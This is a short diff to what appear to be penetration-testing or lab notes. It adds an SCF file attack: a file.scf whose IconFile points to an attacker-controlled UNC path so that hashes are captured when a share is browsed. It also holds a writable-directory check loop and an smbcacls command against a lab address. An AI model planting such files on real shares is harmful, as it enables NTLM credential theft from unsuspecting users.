@@ -32,6 +32,12 @@ find . -type d | while read dir; do touch ${dir}/jenriquez 2>/dev/null && echo "
 
 watch -d "ls /mnt/folder/public/*; /mnt/folder/otro*"
 
+SCF
+https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
+nano public/file.scf
+[Shell]
+Command=2
+IconFile=\\X.X.X.X\folder\jenriquez
 ```
 ```Shell
 smbcacls //10.10.10.40/Users Admin/Desktop -N
